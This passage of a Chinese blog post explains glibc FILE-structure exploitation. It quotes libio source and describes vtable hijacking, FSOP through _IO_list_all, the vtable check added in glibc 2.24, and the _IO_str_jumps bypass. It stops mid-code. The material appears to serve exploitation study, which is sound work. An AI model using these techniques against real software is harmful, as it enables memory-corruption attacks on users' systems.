class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;  <span class="comment">//重要</span></span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其又被封装于_IO_FILE_plus</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><details class="folding-tag" blue><summary> 其中_IO_jump_t结构体的定义为 </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>              </div>            </details><p>一个进程中的所有FILE结构体汇通_chain连接成为一个单链表,链表的头部是全局变量_IO_list_all</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><h2 id="三个特殊流"><a href="#三个特殊流" class="headerlink" title="三个特殊流"></a>三个特殊流</h2><p>在标准 I/O 库中，每个程序启动时有三个文件流是<strong>自动打开</strong>的：<strong>stdin、stdout、stderr</strong>。</p><p>但是在第一次使用前,均属于未被初始化状态(主要是_IO_read_ptr到_IO_buf_end这个8个域),其初始化时分配的缓冲区位于堆,且一般是堆最早的三个堆块.</p><p>因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，需要注意的是<strong>这三个文件流位于 libc.so 的数据段</strong>。而我们使用 <strong>fopen 创建的文件流是分配在堆内存上</strong>的。</p><p>libc.so 中存在 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><details class="folding-tag" blue><summary> 关于上面这句话的理解 </summary>              <div class='content'>              <p>学习过程中经常遇到符号这个概念,这里学习一下</p><p><strong>在 C 语言中，变量的名字就是符号（symbol）</strong>。当编译器编译源代码时，会在符号表（symbol table）中为每个符号分配一个唯一的标识符，并记录它的类型、作用域和存储位置等信息。对于全局变量和静态变量，它们的符号被放置在全局符号表中，而对于局部变量，则被放置在局部符号表中。</p><p><strong>也就是说一个符号被用来代表一个变量的实例,而这个变量可以是结构体,函数或常规变量类型等等</strong></p><p>在了解了符号之后就能理解上面这句话了</p><p><em>IO_2_1_stderr\</em>和_<em>IO_2_1_stdout\</em>和<em>_IO_2_1_stdin\</em>这三个符号对应的是三个IO_FILE<u>结构体变量的名字</u></p><p>stdin\stdout\stderr三个符号是指向三个IO_FILE结构体变量的<u>指针变量的名字</u></p>              </div>            </details><h2 id="fwrite和fread"><a href="#fwrite和fread" class="headerlink" title="fwrite和fread"></a>fwrite和fread</h2><p>fread 的实现被封装在_IO_fread,真正实现功能的是其中的_IO_sgetn,而_IO_sgetn又会调用_IO_XSGETN,而_IO_XSGETN 是vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。默认情况下_IO_file_xsgetn中存储的指针指向_IO_file_xsgetn</p><p>fwrite的实现被封装在_IO_fwrite中,在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。_IO_XSPUTN是位于vtable中的函数指针,在_IO_XSPUTN 指向的_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW,_IO_OVERFLOW 默认指向的函数是_IO_new_file_overflow</p><h2 id="fopen和fclose"><a href="#fopen和fclose" class="headerlink" title="fopen和fclose"></a>fopen和fclose</h2><p>fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><p>fclose的操作是</p><ul><li>将指定的 FILE 从_chain 链表中脱链</li><li>调用系统接口 close 关闭文件</li><li>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</li></ul><h2 id="printf和puts"><a href="#printf和puts" class="headerlink" title="printf和puts"></a>printf和puts</h2><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><hr><h1 id="2-23及以前利用"><a href="#2-23及以前利用" class="headerlink" title="2.23及以前利用"></a>2.23及以前利用</h1><h2 id="伪造劫持vtable"><a href="#伪造劫持vtable" class="headerlink" title="伪造劫持vtable"></a>伪造劫持vtable</h2><p><strong><u>vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递</u></strong></p><p>原理,修改IO_FILE_plus中的vtable指针,将其劫持到一个可控区域,或者在libc2.23之前的版本也可以直接修改vtable中的函数</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP通过劫持_IO_list_all 变量来伪造假的IO_FILE链,并通过调用_IO_flush_all_lockp来触发假的IO_FILE,</p><h3 id="IO-flush-all-lockp初识"><a href="#IO-flush-all-lockp初识" class="headerlink" title="_IO_flush_all_lockp初识"></a>_IO_flush_all_lockp初识</h3><p>函数会刷新_IO_list_all 链表中所有项的文件流，<strong><u>相当于对每个 FILE 调用 fflush(更新缓存区函数)</u></strong>，也对应着会调用vtable 中的_IO_overflow。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见要执行_IO_OVERFLOW的前提是:</p><ol><li><strong>IO_FILE中的_mode变量&lt;=0</strong></li><li><strong>IO_FILE中的_IO_write_ptr大于_IO_write_base</strong></li></ol><p>而_IO_flush_all_lockp 在三种情况下会被系统调用：</p><ol><li><strong>当 libc 执行 abort 流程时</strong></li><li><strong>当执行 exit 函数时</strong></li><li><strong>当执行流从 main 函数返回时</strong></li></ol><p>其中abort流程,在堆的利用中经常用到</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/abort_routine.001.jpeg" alt=""></p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li><p>需要攻击者获知 libc.so 基址，因为_IO_list_all 是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写_IO_list_all。</p></li><li><p>要有能改写IO_list_all的手段</p></li><li><p>要能布置一个满足条件的IO_FILE结构体</p></li></ol><h2 id="2-24后新机制下利用"><a href="#2-24后新机制下利用" class="headerlink" title="2.24后新机制下利用"></a>2.24后新机制下利用</h2><h3 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h3><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在<strong>调用虚函数之前</strong>首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable - <strong>start_</strong>libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 vtable 是非法的，那么会引发 abort。</p><p><u>在加入这个限制后,对vtable的利用几乎难以实现</u></p><p><u>故将视线转向IO_FILE本身</u></p><p>当然这些利用在之前的版本亦有效</p><h3 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h3><p>_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p><p>因为三个标准流的存在</p><p>无需文件操作,直接利用scanf\printf便可以进行利用。</p><p>其中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p><h3 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h3><p>libc.so中还存在其他的无检查的vtable如_IO_str_jumps和_IO_wstr_jumps,其中前者的绕过更为简单</p><p>以前者为例,源码位于bits/strops.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。</p><p><strong>出现的结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> *(*_IO_alloc_type) (_IO_size_t);</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_IO_free_type)</span> <span class="params">(<span class="type">void</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is needed for the Irix6 N32 ABI, which has a 64 bit off_t type,</span></span><br><span class="line"><span class="comment">   but a 32 bit pointer type.  In this case, we get 4 bytes of padding</span></span><br><span class="line"><span class="comment">   after the vtable pointer.  Putting them in a structure together solves</span></span><br><span class="line"><span class="comment">   this problem.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure><h4 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, 